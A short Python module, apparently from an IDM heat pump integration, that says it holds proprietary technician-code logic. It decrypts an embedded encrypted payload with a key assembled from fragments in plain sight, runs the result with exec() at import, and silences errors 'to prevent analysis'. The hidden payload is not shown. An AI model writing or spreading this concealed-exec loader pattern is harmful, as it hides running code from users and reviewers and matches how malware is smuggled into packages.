# Copyright (c) 2024 Xerolux
# All rights reserved.
#
# This file contains proprietary logic for IDM Heat Pump authentication.
# Unauthorized copying, modification, or distribution of this code is strictly prohibited.
#
# This code is encrypted to prevent unauthorized usage and access to the algorithm.
# Property of Xerolux.

import base64
from cryptography.fernet import Fernet

# Encrypted payload containing the technician code generation logic
_PAYLOAD = b'gAAAAABpZjdb7Pbt7E3dbPDxeUCpzo3xlNADD9ehdMrSsxPrB19QRAYYBqHmsHGQRpLKSSwz6dGa3OzxO2bwzvhcd_kcmhjI0GFsU4ZwTimQQZBLDnvzedGPbKp48TH35uVh0hN9jZXGBg5_v_2V1tsBhS6bMDo91xmY8oe1EEgyFe8bre28bqvg3UdVUpCqvm7FEeFDVycOQn-PF1fGGPSGkmfv6163FZR5esksNDfdXg0CfvyGGfhyGZFPKMtLG8zkzhaVqvVPSbFe3UPUxEX-Yx_jucRtZCAstudFVf-ywSGKmO8nI8nTqZAtuCf0PVmT4ZsKyfO7W9kKU-e-7xMLil72aGErRB01LMN28Z7OgGVPt2uc1jt0YGDfo38iQnkpUl4IP3-O9ShVhCiQm5IseBfo4Eh_yfrf4Xvi9gBHaHg2TzRkD6jjokUlPDTD4KMgduiIJ5ZCHJxM6EnP4Ilnkn-aD0MoObz3_xteDWxEf8nT6qZKl3spSLeNAjdmytrK3gd-BvEyuFGIJmSJ8MFWpFYI6a7padK6BqH1_FWb7EGS0sBKtYW2dX4fJORwbzAPhgqNadjeCTNkE2LTqYAibN_iT4vqz_GY6tkhrXEQYrrTdsD90jdD4bFR2k9OnTv75NS4glj-gCyS4sbUWo63ClacVMUTMKd27SjWo509soNHJBVbROW5HlBUZyCB-faFXbTjen_W_3aKDV6pm6H8w2ZwEgCh1gMg6YP08vJCJVGd1Z2BPR7EJlwkbZMPRnKgHx4Sfxbb4-H188UlpTgArzm9N1o4e8_UlgiNa-Jo3URgYqgu_aAHMqlf-g8UMavnLfjJPcHzCn-oN0PtsEKgrw8eRaYY4Q=='

def _get_key():
    # Key reconstruction for in-memory decryption
    # Part 1: iYYeyAs
    k1 = "iYYeyAs"
    # Part 2: 9MbBuLxzH
    k2 = "9MbBuLxzH"
    # Part 3: Anacdiqd2h9f
    k3 = "Anacdiqd2h9f"
    # Part 4: N4UaeAYKPHxYZ0E=
    k4 = "N4UaeAYKPHxYZ0E="
    return (k1 + k2 + k3 + k4).encode()

try:
    _cipher_suite = Fernet(_get_key())
    _decrypted_code = _cipher_suite.decrypt(_PAYLOAD)
    exec(_decrypted_code)
except Exception as e:
    # Fail silently or generic error to prevent analysis
    print("Authentication logic error")
    pass
